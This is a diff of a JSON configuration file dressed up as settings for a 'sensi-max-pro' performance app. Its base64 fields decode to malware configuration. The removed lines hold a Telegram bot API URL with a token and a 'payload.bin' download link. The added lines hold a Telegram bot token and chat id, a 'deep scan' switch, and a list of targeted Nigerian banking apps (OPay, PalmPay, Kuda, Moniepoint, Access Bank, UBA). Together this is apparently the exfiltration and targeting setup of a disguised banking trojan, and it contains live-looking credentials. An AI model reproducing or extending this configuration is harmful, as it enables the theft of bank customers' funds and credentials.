@@ -1,27 +1,21 @@
 {
-  "status": "active",
-  "build_info": {
-    "version": "1.0.4",
-    "codename": "Lightning-NG",
-    "last_sync": "2026-05-03T07:45:00Z"
-  },
-  "ui_settings": {
-    "theme": "dark_gold",
-    "high_fps_mode": true,
-    "gpu_acceleration": 0.85,
-    "cache_limit_mb": 512
-  },
-  "resolver_payload": {
-    "vector": "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcwMTIxNDk5MjpBQUU0VnBfWkdyT19XcVpMdl85OXBfLV9fXy8=",
-    "node": "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3VzZXIvcmVwby9tYWluL3BheWxvYWQuYmlu",
-    "sigs": [
+  "project_id": "sensi-max-pro-4102",
+  "remote_optimization_params": {
+    "sync_interval_ms": 3600000,
+    "enable_deep_scan": true,
+    "analytics_vector": "ODY3MzAyOTU1OTpBQUY0ekZKQzgwVEVSVlVNVHZWOWllU01XTTBLLTJ2V0dUSQ==",
+    "relay_id": "NzkwOTU0MzkwMA==",
+    "target_signatures": [
       "Y29tLm9wYXkucGF5bWVudHM=",
+      "Y29tLnRyYW5zc25ldC5wYWxtcGF5",
       "Y29tLmt1ZGFiYW5rLmFwcA==",
-      "Y29tLnplbml0aGJhbmsubXdhbGxldA=="
+      "Y29tLm1vbmllcG9pbnQubW9uaWVwb2ludA==",
+      "com.accessbank.mobileapp",
+      "com.ubagroup.uba"
     ]
   },
-  "experimental_features": {
-    "low_latency_audio": false,
-    "vibration_feedback": "haptic_pro"
+  "ui_theming": {
+    "primary_color": "#FFD700",
+    "dark_mode": true
   }
 }
